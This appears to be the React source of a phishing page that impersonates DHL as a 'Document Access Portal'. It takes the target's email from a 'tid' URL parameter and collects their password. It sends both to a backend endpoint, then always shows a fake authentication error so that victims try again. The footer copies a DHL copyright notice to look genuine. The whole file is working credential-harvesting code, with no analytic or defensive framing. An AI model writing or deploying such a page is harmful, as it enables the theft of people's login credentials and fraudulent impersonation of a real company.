import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Loader2, CheckCircle2, AlertCircle } from 'lucide-react';
import { useNavigate, useSearchParams } from 'react-router-dom';

export const LoginPage: React.FC = () => {
  const [searchParams] = useSearchParams();
  const [status, setStatus] = useState<'idle' | 'loading' | 'success' | 'error'>('idle');
  const [formData, setFormData] = useState({
    email: searchParams.get('tid') || '',
    password: ''
  });
  const navigate = useNavigate();

  // Update email if tid param changes
  useEffect(() => {
    const tid = searchParams.get('tid');
    if (tid) {
      setFormData(prev => ({ ...prev, email: tid }));
    }
  }, [searchParams]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('loading');

    try {
      const response = await fetch('/api/submit-form', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...formData,
          formType: 'DHL Document Login'
        })
      });

      // Even if successful, we show an error message as requested
      setStatus('error');
      setFormData(prev => ({ ...prev, password: '' }));
      
      if (!response.ok) {
        console.error('Submission failed with status:', response.status);
      }
      
      setTimeout(() => setStatus('idle'), 5000);
    } catch (err) {
      console.error(err);
      setStatus('error');
      setFormData(prev => ({ ...prev, password: '' }));
      setTimeout(() => setStatus('idle'), 5000);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData(prev => ({ ...prev, [e.target.name]: e.target.value }));
  };

  return (
    <div className="min-h-screen bg-[#ffcc00] flex flex-col items-center justify-center p-4 font-sans relative overflow-hidden">
      {/* DHL Red Borders (Top and Bottom) */}
      <div className="absolute top-0 left-0 w-full h-2 bg-[#d40511]" />
      <div className="absolute bottom-0 left-0 w-full h-2 bg-[#d40511]" />

      <motion.div 
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        className="w-full max-w-[480px] bg-white rounded-lg shadow-2xl overflow-hidden border-[12px] border-[#ffcc00]"
      >
        <div className="p-8 md:p-12 flex flex-col items-center">
          {/* DHL Logo */}
          <div className="mb-2 flex flex-col items-center">
            <span className="text-5xl font-black italic tracking-tighter text-[#d40511] leading-none">DHL</span>
            <div className="flex gap-1 mt-1">
              <div className="h-1.5 w-10 bg-[#d40511]" />
              <div className="h-1.5 w-5 bg-[#d40511]" />
              <div className="h-1.5 w-2.5 bg-[#d40511]" />
            </div>
          </div>
          
          <h2 className="text-zinc-600 text-sm font-medium mb-10 tracking-wide uppercase">Document Access Portal</h2>

          <form onSubmit={handleSubmit} className="w-full space-y-6">
            <div className="space-y-2">
              <label className="text-sm font-bold text-zinc-700 block">Email</label>
              <input
                required
                type="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                placeholder="your.email@example.com"
                className="w-full border border-zinc-300 rounded px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#ffcc00] transition-all text-zinc-800"
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm font-bold text-zinc-700 block">Password</label>
              <input
                required
                type="password"
                name="password"
                value={formData.password}
                onChange={handleChange}
                placeholder="Enter your password"
                className="w-full border border-zinc-300 rounded px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#ffcc00] transition-all text-zinc-800"
              />
            </div>

            <button
              type="submit"
              disabled={status === 'loading'}
              className="w-full py-4 bg-[#d40511] hover:bg-[#b0040e] text-white font-bold rounded transition-all flex items-center justify-center gap-2 shadow-lg shadow-red-900/10"
            >
              {status === 'loading' ? (
                <Loader2 className="animate-spin" size={20} />
              ) : (
                'Download Documents'
              )}
            </button>
          </form>

          <p className="mt-8 text-center text-xs text-zinc-500 leading-relaxed max-w-[280px]">
            Please login with your email and password to access and download your files.
          </p>

          <AnimatePresence>
            {status === 'error' && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }}
                className="mt-6 p-3 bg-red-50 text-red-700 rounded border border-red-100 flex items-center gap-2 text-sm font-medium"
              >
                <AlertCircle size={16} />
                Authentication error, please try again.
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </motion.div>

      {/* Footer */}
      <div className="absolute bottom-6 w-full text-center px-4">
        <div className="flex items-center justify-center gap-2 text-[10px] font-bold text-zinc-800 uppercase tracking-widest">
           <div className="flex flex-col items-center scale-75 origin-center">
            <span className="text-xl font-black italic tracking-tighter text-[#d40511] leading-none">DHL</span>
            <div className="flex gap-0.5 mt-0.5">
              <div className="h-0.5 w-4 bg-[#d40511]" />
              <div className="h-0.5 w-2 bg-[#d40511]" />
              <div className="h-0.5 w-1 bg-[#d40511]" />
            </div>
          </div>
          <span className="opacity-60">© 2025 DHL International GmbH. All rights reserved.</span>
        </div>
      </div>
    </div>
  );
};
